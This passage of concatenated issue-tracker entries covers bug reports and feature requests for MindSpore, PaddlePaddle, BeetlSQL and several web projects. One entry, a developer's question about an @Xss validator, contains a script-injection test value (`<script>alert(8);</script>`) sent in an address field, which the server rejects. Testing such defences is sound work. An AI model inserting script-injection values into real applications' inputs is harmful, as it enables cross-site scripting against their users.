io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:30) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:149) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.GeneratedMethodAccessor250.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:426) ... 122 common frames omitted"
在请求日志中显示后端框架名称,在请求日志中显示后端框架名称 如：   <code>: [Forest] Request (okhttp3): GET http://localhost:8080/ HTTP ... ...
json序列化，使用fst存在偶发性提示字段不存在的问题,json序列化，使用fst存在偶发性提示字段不存在的问题 尚不是很明确原因，-_- @红薯 可以试试用 fastjson 全序列化代替 FSTConfiguration.createJsonConfiguration()   <code>: warning: unknown field: xxx on class xxx
oracle环境下代码生成org.beetl.sql.core.db.MetadataManager.initMetadata() 166行报错,"以上问题是因为使用：MysqlStyle style = new MysqlStyle(); 所致。   <code>: Exception in thread ""main"" org.beetl.sql.core.BeetlSQLException: java.sql.SQLException: ORA-06575: 程序包或函数 DBMS_XMLSCHEMA_INT 处于无效状态 ORA-06512: 在 ""SYS.XML_SCHEMA_NAME_PRESENT"", line 17 at org.beetl.sql.core.db.MetadataManager.initMetadata(MetadataManager.java:179) at org.beetl.sql.core.db.MetadataManager.getTableFromMap(MetadataManager.java:81) at org.beetl.sql.core.db.MetadataManager.getTable(MetadataManager.java:58) at org.beetl.sql.ext.gen.SourceGen.gen(SourceGen.java:70) at org.beetl.sql.core.SQLManager.genPojoCodeToConsole(SQLManager.java:1185) at com.xdja.hy.sys.soa.test.TestBeetlSql.main(TestBeetlSql.java:47) Caused by: java.sql.SQLException: ORA-06575: 程序包或函数 DBMS_XMLSCHEMA_INT 处于无效状态 ORA-06512: 在 ""SYS.XML_SCHEMA_NAME_PRESENT"", line 17 at oracle.jdbc.driver.T4CTTIoer.processError(T4CTTIoer.java:445) at oracle.jdbc.driver.T4CTTIoer.processError(T4CTTIoer.java:396) at oracle.jdbc.driver.T4C8Oall.processError(T4C8Oall.java:879) at oracle.jdbc.driver.T4CTTIfun.receive(T4CTTIfun.java:450) at oracle.jdbc.driver.T4CTTIfun.doRPC(T4CTTIfun.java:192) at oracle.jdbc.driver.T4C8Oall.doOALL(T4C8Oall.java:531) at oracle.jdbc.driver.T4CPreparedStatement.doOall8(T4CPreparedStatement.java:207) at oracle.jdbc.driver.T4CPreparedStatement.executeForDescribe(T4CPreparedStatement.java:884) at oracle.jdbc.driver.OracleStatement.executeMaybeDescribe(OracleStatement.java:1167) at oracle.jdbc.driver.OracleStatement.doExecuteWithTimeout(OracleStatement.java:1289) at oracle.jdbc.driver.OraclePreparedStatement.executeInternal(OraclePreparedStatement.java:3584) at oracle.jdbc.driver.OraclePreparedStatement.executeQuery(OraclePreparedStatement.java:3628) at oracle.jdbc.driver.OraclePreparedStatementWrapper.executeQuery(OraclePreparedStatementWrapper.java:1493) at oracle.jdbc.OracleDatabaseMetaData.getTables(OracleDatabaseMetaData.java:3077) at org.beetl.sql.core.db.MetadataManager.initMetadata(MetadataManager.java:166) ... 5 more"
 [新功能] 切面上下文支持SaaS租户模式,占位 ，自动填充   <code>: TenantId
[CT][MS][OCCM][AICPU-Digamma]Digamma operator test cases have TypeError with dtype float64 on Ascend,"test cases have TypeError with dtype float64 on Ascend. / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_dynamic_shape_digamma_5d_float64 def test_dynamic_shape_digamma_5d_float64(): input_x = Tensor(np.random.rand(16, 9, 8, 6, 10).astype(np.float64) ) fact = DigammaMock(inputs=[input_x]) test_digamma.py:62: ../share/ops/primitive/digamma_ops.py:64: in forward_dynamic_shape_cmp out_mindspore = self.forward_mindspore_dynamic_shape_impl() ../share/ops/primitive/digamma_ops.py:55: in forward_mindspore_dynamic_shape_impl out_ms = ms_net(self.input_x) /root/archiconda3/envs/sjx/lib/python3.7/site-packages/mindspore/nn/cell.py:627: in call out = self.compile_and_run(*args) /root/archiconda3/envs/sjx/lib/python3.7/site-packages/mindspore/nn/cell.py:943: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/sjx/lib/python3.7/site-packages/mindspore/nn/cell.py:927: in compile jit_config_dict=self._jit_config_dict) self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff55b397d0&gt;, obj = Digamma&lt;&gt;, phase = 'train.1670389369057223168.281470526746064.4', do_convert = True, jit_config_dict = {} args = (Tensor(shape=[-1, -1, -1, -1, -1], dtype=Float64, value= ),) E TypeError: Can not select a valid kernel info for [Digamma] in AI CORE or AI CPU kernel info candidates list. E E ---------------------------------------------------- E - Kernel Info Candidates List: E ---------------------------------------------------- E E AI CORE: E {} E AI CPU: E () -&gt; () E () -&gt; () E E Please check the given data type or shape: E AI CORE: : (&lt;Tensor[Float64], {shape:(-1, -1, -1, -1, -1)|min shape:()|max shape:()}&gt;) -&gt; (&lt;Tensor[Float64], {shape:(-1, -1, -1, -1, -1)|min shape:()|max shape:()}&gt;) E AI CPU: : (&lt;Tensor[Float64], {shape:(-1, -1, -1, -1, -1)|min shape:()|max shape:()}&gt;) -&gt; (&lt;Tensor[Float64], {shape:(-1, -1, -1, -1, -1)|min shape:()|max shape:()}&gt;) E For more details, please refer to 'Kernel Select Failed' at https://www.mindspore.cn E E ---------------------------------------------------- E - The Function Call Stack: (For framework developers) E ---------------------------------------------------- E In file /home/sjx/MindSporeTest/share/ops/primitive/digamma_ops.py:20/ return self.Digamma_op(x)/ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_graph_optimization.cc:398 SetOperatorInfo /root/archiconda3/envs/sjx/lib/python3.7/site-packages/mindspore/common/api.py:1320: TypeError 2. 3. pass   <code>: fact.forward_dynamic_shape_cmp() def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(obj, args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode())"
在前后端不分离版本中，@xss注解移动端调用的bean的某个属性时，异常消息如何抛到界面？,"我在不分离的4.6.0版本中，按照：5587d39 升级，使@xss注解来防攻击，但是在前后端分离的api中，如何把注解的消息抛给页面？ps：从后端可看到抛出异常，xss拦截成功了： 14:35:50.629 [http-nio-9081-exec-9] ERROR c.p.f.w.e.GlobalExceptionHandler - [handleException,74] - Validation failed for argument [0] in public com.psmall.common.core.domain.AjaxResult com.psmall.api.order.orderAddressController.editAddress(com.psmall.api.order.modal.UserAddressParam): [Field error in object 'userAddressParam' on field 'address': rejected value [&lt;script&gt;alter(8);&lt;/script&gt;]; codes [Xss.userAddressParam.address,Xss.address,Xss.java.lang.String,Xss]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [userAddressParam.address,address]; arguments []; default message [address]]; default message [收货详细地址不能包含脚本字符]] org.springframework.web.bind.MethodArgumentNotValidException: Validation failed for argument [0] in public com.psmall.common.core.domain.AjaxResult com.psmall.api.order.orderAddressController.editAddress(com.psmall.api.order.modal.UserAddressParam): [Field error in object 'userAddressParam' on field 'address': rejected value [&lt;script&gt;alter(8);&lt;/script&gt;]; codes [Xss.userAddressParam.address,Xss.address,Xss.java.lang.String,Xss]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [userAddressParam.address,address]; arguments []; default message [address]]; default message [收货详细地址不能包含脚本字符]] at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.resolveArgument(RequestResponseBodyMethodProcessor.java:139) at org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:121) at org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:167) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:134) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ============================================================== 移动端调用的api： 其中address属性的注解使用@xss： 移动端调用：   <code>: @ApiOperation(value = ""编辑或新增用户地址"") @PostMapping(""/editAddress"") public AjaxResult editAddress(@Validated @RequestBody UserAddressParam param) { Long addressId = param.getAddressId(); // 其它代码 （略） return AjaxResult.success(updateAddress); } @Data @ApiModel(""用户地址"") public class UserAddressParam { @ApiModelProperty(""地址ID"") private Long addressId; /** 收货详细地址 */ @Xss(message = ""收货详细地址不能包含脚本字符"") @ApiModelProperty(""收货详细地址"") @Size(min = 0, max = 50, message = ""收货详细地址长度不能超过50个字符"") private String address; // ..... } var params = { url: url, method: method, data: { address: '&lt;script&gt;alert(8);&lt;/script&gt;' }, callBack: function(res) { uni.hideLoading() uni.navigateBack({ delta: 1 }); } }; http.request(params);"
`LargerThan` should be `GreaterThan`,"We use to assert that the value of A should be bigger than the value of B. However, is a more suitable name, which can avoid the abbreviation conflict with .   <code>: LargerThan GreaterThan LessThan"
Need an interface to get Place instance,"When I call in Op Kernel, the code like: How about add an interface in named : So the code will be chaned into:   <code>: memory::Copy paddle::memory::Copy&lt;Place, Place&gt;( boost::get&lt;Place&gt;(ctx.GetPlace()), static_cast&lt;void*&gt;(dst), boost::get&lt;Place&gt;(ctx.GetPlace()), static_cast&lt;const void*&gt;(src), num); framework::ExecutionContext Place() template&lt;typename T&gt; inline const T&amp; Place() { return boost::get&lt;T&gt;(device_context_-&gt;GetPlace()); } paddle::memory::Copy&lt;Place, Place&gt;( ctx.Place&lt;Place&gt;(), static_cast&lt;void*&gt;(dst), ctx.Place&lt;Place&gt;(), static_cast&lt;const void*&gt;(src), num);"
springmvc 整合中文乱码问题,请问一下，我这边springmvc 消息中文乱码，看了下源码 处理请求的方法 WeixinControllerSupport.java，不设置response设置编码UTF-8，不会产生乱码问题吗？   <code>: @RequestMapping(method = RequestMethod.POST) @ResponseBody protected final String process(HttpServletRequest request)
Remove the main function inside the test file,"Fix #975:[In Progress] Fix bug: enable sparse weigth setting in trainer_config_helper APIs Fix #1031:how to add L1,L2 with sgd Most of the rest of the tests require to work. Others require weird initialization.   <code>: initPython"
[ST][MS][NET][ssd][910 1p/8p]FPS[502] can not reach 600,"/ 硬件环境: /device ascend : -- MindSpore version :r1.8.0 B030 commit_id:83905777 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : ok版本： run包:HiAI/HISI_C82/20220609 MindSpore 版本：编译时间20220614211828 r1.8.0-B020 commit_id:ac72a96de9e 失败版本： run包:HiAI/HISI_C82/20220616 MindSpore 版本：编译时间20220623222559 r1.8.0-B030 commit_id:83905777 (/): /mode graph test_ms_ssd_coco_train_check_fps_910_1p_0001.py test_ms_ssd_coco_check_loss_910_8p_0001.py cd solution_test/cases/02network/00cv/ssd/train pytest -s test_ms_ssd_coco_train_check_fps_910_1p_0001.py 网络训练成功，性能能达到600/fps 走给徐邦铎   <code>: Train epoch time: 193578.998 ms, per step time: 193.579 ms Train epoch time: 54179.095 ms, per step time: 54.179 ms Train epoch time: 57067.746 ms, per step time: 57.068 ms"
[MS][NET][MASS][GPU 8p]NameError: name 'logger' is not defined,": /device gpu : -- MindSpore version :commit_id: ebc8874b -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_model_zoo_mass_gigaword_corpus_8p_gpu.py get code from model_zoo sh run_gpu.sh NameError: name 'logger' is not defined network train success MASS网络在GPU环境8p训练失败   <code>: Traceback (most recent call last): File ""train.py"", line 356, in &lt;module&gt; train_parallel(config.device_target) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/mass/network/test_ms_model_zoo_mass_gigaword_corpus_8p_gpu/train_mass_0/src/model_utils/moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 302, in train_parallel platform=platform) File ""train.py"", line 229, in _build_training_pipeline config=ckpt_config) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/callback/_checkpoint.py"", line 311, in __init__ self._directory = _make_directory(directory) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/_utils.py"", line 85, in _make_directory logger.debug(""The abs path is %r"", path) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/log.py"", line 205, in debug _get_logger().debug(msg, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/log.py"", line 158, in _get_logger logger = _setup_logger(_adapt_cfg(kwargs)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/log.py"", line 526, in _setup_logger logfile_dir = _create_logfile_dir(kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/log.py"", line 463, in _create_logfile_dir rank_id = _get_rank_id() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/log.py"", line 443, in _get_rank_id logger.warning(""Environment variables RANK_ID and OMPI_COMM_WORLD_RANK both exist,"" NameError: name 'logger' is not defined"
table的表头基本参数cols添加img类型,"如果数据表格中添加图片必须使用tepmlet,如果cols的type属性添加一个image类型,然后field值传一个url就可以显示 预期实现: 目前的解决方案:   <code>: {title: '图片', width: 80, field: 'avatar',type:'image'}, {title: '车图片', width: 80, field: 'avatar', templet: function (data) { return '&lt;img src=""'+data.avatar+'"" /&gt;'; } },"
【众智】【计算-TBE接入】Pdist,"算子交付规格 支持类型：float32, float16 ，(其中float16 精度问题放宽精度标准，对标框架pytorch： CPU和GPU均不支持float16，无法直接对比float16的精度。使用pytorch的float32进行计算会产生以上误差，经过暂时无法避免。) 1、只关注Ascend平台。CPU平台为众筹算子。 2、p的值超过50时pytorch正向返回inf，无法测试正向精度； 3、fp16类型的反向精度受到p的值大小影响，无法以固定的loss进行验收，例如（以输入shape为120*100为例）， p值较小时精度可以满足2e-3， p值大概超过5后误差只能满足4e-3， p的值大概超过8后，例如p=10.6时就只能满足5e-3的精度要求， p值更大时，例如p=20.6时会5e-3的精度也不能满足 计算输入中每??对行向量之间的 p 范数距离。 接口目录：mindspore/ops/operations/nn_ops.py x y p float 可选属性 对应底层算子 对应底层AICPU算子Pdist 接入PdistGrad算子。   <code>: class Pdist(Primitive):"
系统监控-在线用户-点击登录时间进行排序时报错,数据库字段为 排序传参为，较数据库中少了个s。 需要修改数据库中表结构为，同时对应修改实体类与映射关系。   <code>: start_timestsamp startTimestamp start_timestamp
Android Studio 2.3默认使用Gradle 3.3同步会报错的问题及解决办法,问题描述： Android Studio 2.3默认使用Gradle 3.3同步会报错的问题，android app v2.8.3正确的Gradle版本是2.14.1，使用Android Studio 2.3默认的Gradle 3.3同步会报错，版本太高不能同步（见问题截图）。 问题截图： android-app\gradle\wrapper\gradle-wrapper.properties 提交文件的内容：   <code>: #Tue Apr 04 20:44:23 CST 2017 distributionBase=GRADLE_USER_HOME distributionPath=wrapper/dists zipStoreBase=GRADLE_USER_HOME zipStorePath=wrapper/dists distributionUrl=https\://services.gradle.org/distributions/gradle-2.14.1-all.zip
【租户管理】初始化数据的字典项所属字典ID 未更新,pigx版本: 3.2 操作系统: MACOS 是否修改包名: 否 此描述属于上述哪个等级: a 3.2版 新建租户的时候，会初始化一些东西，其中创建dict的时候，dict_item表的dict_id自动维护不正确，还是旧的。   <code>: // 处理字典项最新关联的字典ID List&lt;SysDictItem&gt; itemList = dictList.stream() .flatMap(dict -&gt; dictItemList.stream() .filter(item -&gt; item.getType().equals(dict.getType())) .peek(item -&gt; item.setDictId(dict.getId()))) .collect(Collectors.toList());
针对软删除的数据显示进行优化,现在为直接显示为 字眼 计划优化为 后面带上 的标识   <code>: 未知 原来的名称 已经被删除
[ST][MS][NET][vgg16/gcn][310]x86的环境无法加载MindIR,"x86的环境无法加载MindIR导致build失败 Hardware Environment(/) / 硬件环境: /device ascend 310 : -- MindSpore version :1.9.0.20220819 -- Python version :Python3.7 -- OS platform and distribution : -- GCC/Compiler version : commit_id = ''[sha1]:4e8cc723,[branch]:(HEAD,origin/master,origin/HEAD,master)'' (/): /mode pynative /mode graph test_ms_vgg16_imagenet_310_gpu__mindir_infer_0002.py test_ms_gcn_citeseer_infer_ascend_mindir_310_0001.py 1.pytest -s test_ms_vgg16_imagenet_310_gpu__mindir_infer_0002.py pythst -s test_ms_gcn_citeseer_infer_ascend_mindir_310_0001.py build success and test case pass 走给龚立尧   <code>: [WARNING] GE_ADPT(22832,7fb24d3e1040,main):2022-08-19-22:13:18.533.068 [mindspore/ccsrc/transform/graph_ir/op_adapter_util.cc:224] ConvertAnyUtil] Unsupported value type: Float to convert to tensor. Value: Float16 [WARNING] ME(22832,7fb2225c8700,main):2022-08-19-22:13:26.135.157 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:238] HeartbeatThreadFuncInner] Peer stopped [ERROR] ME(22832,7fb24d3e1040,main):2022-08-19-22:13:26.135.348 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:208] operator()] Receive result model from child process failed [ERROR] ME(22832,7fb24d3e1040,main):2022-08-19-22:13:26.135.746 [mindspore/ccsrc/cxx_api/model/model_converter_utils/multi_process.cc:118] ParentProcess] Parent process process failed [ERROR] ME(22832,7fb24d3e1040,main):2022-08-19-22:13:26.135.957 [mindspore/ccsrc/cxx_api/model/acl/model_converter.cc:242] LoadMindIR] Convert MindIR model to OM model failed [ERROR] ME(22832,7fb24d3e1040,main):2022-08-19-22:13:26.135.982 [mindspore/ccsrc/cxx_api/model/acl/acl_model.cc:79] Build] Load MindIR failed. ERROR: Build failed. [ERROR] TBE(22948,python3):2022-08-19-22:13:26.228.880 [../repository_manager/utils/repository_manager_log.py:29][log] [utils/common.py:98][repository_manager] The main process does not exist. We would kill multiprocess manager process: 22845. [ERROR] TBE(22947,python3):2022-08-19-22:13:26.247.192 [../repository_manager/utils/repository_manager_log.py:29][log] [route.py:74][repository_manager] Subprocess[task_distribute] raise error[] Process ForkServerProcess-3: Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/process.py"", line 297, in _bootstrap self.run() File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/process.py"", line 99, in run self._target(*self._args, **self._kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/common/repository_manager/route.py"", line 75, in wrapper raise exp File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/common/repository_manager/route.py"", line 72, in wrapper func(*args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/tbe/common/repository_manager/route.py"", line 388, in task_distribute key, func_name, detail = task_queue.get() File ""&lt;string&gt;"", line 2, in get File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/managers.py"", line 819, in _callmethod kind, result = conn.recv() File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/connection.py"", line 250, in recv buf = self._recv_bytes() File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/connection.py"", line 407, in _recv_bytes buf = self._recv(4) File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/connection.py"", line 383, in _recv raise EOFError EOFError /home/miniconda3/envs/ci/lib/python3.7/multiprocessing/semaphore_tracker.py:144: UserWarning: semaphore_tracker: There appear to be 91 leaked semaphores to clean up at shutdown len(cache))"
[CT][MS][OP]L1loss has precision problem at cpu ,"CPU后端， target dtype 是int8， 另一个dtype float32,对比精度失败 / 硬件环境: CPU /device cpu : -- MindSpore version :commit_id = ''[sha1]:0fe62c1b,[branch]:(HEAD,mr-origin-26226)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph cpu环境上，执行测试用例 结果对标通过， 用例pass   <code>: def test_l1loss_input_7d(): fact = L1LossFactory(input_shape=(10, 5, 32, 8, 16, 4, 1), target_shape=(10, 5, 32, 8, 16, 4, 10), reduction='mean', dtype=np.float32, dtype_target=np.int8) fact.forward_cmp() fact.grad_cmp() def test_l1loss_input_7d(): fact = L1LossFactory(input_shape=(10, 5, 32, 8, 16, 4, 1), target_shape=(10, 5, 32, 8, 16, 4, 10), reduction='mean', dtype=np.float32, dtype_target=np.int8) &gt; fact.forward_cmp() test_l1loss.py:129: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/l1loss_ops.py:66: in forward_cmp allclose_nparray(out_pytorch, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array(0.9562907, dtype=float32), data_me = array(0.9524032, dtype=float32), rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[0.9562907] E data_me_error:[0.9524032] E loss:[0.00388753]"
Add axis for `mul_op` and `rowwise_add_op`,"fixes #3722:Concat Operator Add a global function to convert a tensor to a matrix. Add attributes and for and adjust its and kernel computation. mean how many dimensions will be producted togother to build the result matrix's first dimension. e.g. [2,3,4,5,6] num_col_dims=3 ====&gt; [24, 30] Add unit tests for cases that takes tensors as inputs Add axis for Add unit tests for cases that takes tensors as inputs   <code>: FlattenToMatrix x_num_col_dims y_num_col_dims mul_op InferShape num_col_dims mul_op rowwise_add_op rowwise_add_op"
warning in inference/tests/book/test_helper.h,"https://paddleci.ngrok.io/viewLog.html?buildId=27697&amp;buildTypeId=Paddle_PrCi&amp;tab=buildLog   <code>: [20:28:37] In file included from /paddle/paddle/inference/tests/book/test_inference_recognize_digits.cc:15:0: [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h: In instantiation of 'testing::AssertionResult testing::internal::CmpHelperEQ(const char*, const char*, const T1&amp;, const T2&amp;) [with T1 = long unsigned int; T2 = int]': [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h:1421:23: required from 'static testing::AssertionResult testing::internal::EqHelper&lt;lhs_is_null_literal&gt;::Compare(const char*, const char*, const T1&amp;, const T2&amp;) [with T1 = long unsigned int; T2 = int; bool lhs_is_null_literal = false]' [20:28:37] /paddle/paddle/inference/tests/book/test_helper.h:67:3: required from 'void CheckError(paddle::framework::LoDTensor&amp;, paddle::framework::LoDTensor&amp;) [with T = float]' [20:28:37] /paddle/paddle/inference/tests/book/test_inference_recognize_digits.cc:59:37: required from here [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h:1392:11: warning: comparison between signed and unsigned integer expressions [-Wsign-compare] [20:28:37] if (lhs == rhs) { [20:28:37] ^ [20:28:37] In file included from /paddle/paddle/inference/tests/book/test_inference_image_classification.cc:15:0: [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h: In instantiation of 'testing::AssertionResult testing::internal::CmpHelperEQ(const char*, const char*, const T1&amp;, const T2&amp;) [with T1 = long unsigned int; T2 = int]': [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h:1421:23: required from 'static testing::AssertionResult testing::internal::EqHelper&lt;lhs_is_null_literal&gt;::Compare(const char*, const char*, const T1&amp;, const T2&amp;) [with T1 = long unsigned int; T2 = int; bool lhs_is_null_literal = false]' [20:28:37] /paddle/paddle/inference/tests/book/test_helper.h:67:3: required from 'void CheckError(paddle::framework::LoDTensor&amp;, paddle::framework::LoDTensor&amp;) [with T = float]' [20:28:37] /paddle/paddle/inference/tests/book/test_inference_image_classification.cc:59:37: required from here [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h:1392:11: warning: comparison between signed and unsigned integer expressions [-Wsign-compare] [20:28:37] if (lhs == rhs) { [20:28:37] ^ [20:28:37] In file included from /paddle/paddle/inference/tests/book/test_inference_image_classification.cc:15:0: [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h: In instantiation of 'testing::AssertionResult testing::internal::CmpHelperEQ(const char*, const char*, const T1&amp;, const T2&amp;) [with T1 = long unsigned int; T2 = int]': [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h:1421:23: required from 'static testing::AssertionResult testing::internal::EqHelper&lt;lhs_is_null_literal&gt;::Compare(const char*, const char*, const T1&amp;, const T2&amp;) [with T1 = long unsigned int; T2 = int; bool lhs_is_null_literal = false]' [20:28:37] /paddle/paddle/inference/tests/book/test_helper.h:67:3: required from 'void CheckError(paddle::framework::LoDTensor&amp;, paddle::framework::LoDTensor&amp;) [with T = float]' [20:28:37] /paddle/paddle/inference/tests/book/test_inference_image_classification.cc:59:37: required from here [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h:1392:11: warning: comparison between signed and unsigned integer expressions [-Wsign-compare] [20:28:37] if (lhs == rhs) { [20:28:37] ^ [20:28:37] In file included from /paddle/paddle/inference/tests/book/test_inference_label_semantic_roles.cc:15:0: [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h: In instantiation of 'testing::AssertionResult testing::internal::CmpHelperEQ(const char*, const char*, const T1&amp;, const T2&amp;) [with T1 = long unsigned int; T2 = int]': [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h:1421:23: required from 'static testing::AssertionResult testing::internal::EqHelper&lt;lhs_is_null_literal&gt;::Compare(const char*, const char*, const T1&amp;, const T2&amp;) [with T1 = long unsigned int; T2 = int; bool lhs_is_null_literal = false]' [20:28:37] /paddle/paddle/inference/tests/book/test_helper.h:67:3: required from 'void CheckError(paddle::framework::LoDTensor&amp;, paddle::framework::LoDTensor&amp;) [with T = float]' [20:28:37] /paddle/paddle/inference/tests/book/test_inference_label_semantic_roles.cc:77:37: required from here [20:28:37] /paddle/build/third_party/install/gtest/include/gtest/gtest.h:1392:11: warning: comparison between signed and unsigned integer expressions [-Wsign-compare] [20:28:37] if (lhs == rhs) {"
Serialize variables directly without copying data before sending to gRPC,"As https://github.com/PaddlePaddle/Paddle/issues/8638 mentioned, we need to write a new method of serialize variable data to .   <code>: ::grpc::ByteBuffer"
images 类型字段在只上传了一张图的时候返回的数据是字符串类型，应该是个数组,application/cms/model/Cms.php 的 dealModelShowData 方法 做了如下修改： 目前感觉这样改效果良好。   <code>: case 'images': $newdata[$key] = empty($value) ? [] : get_file_path($value); if (!is_array($newdata[$key])) { $newdata[$key] = array($newdata[$key]); } break;
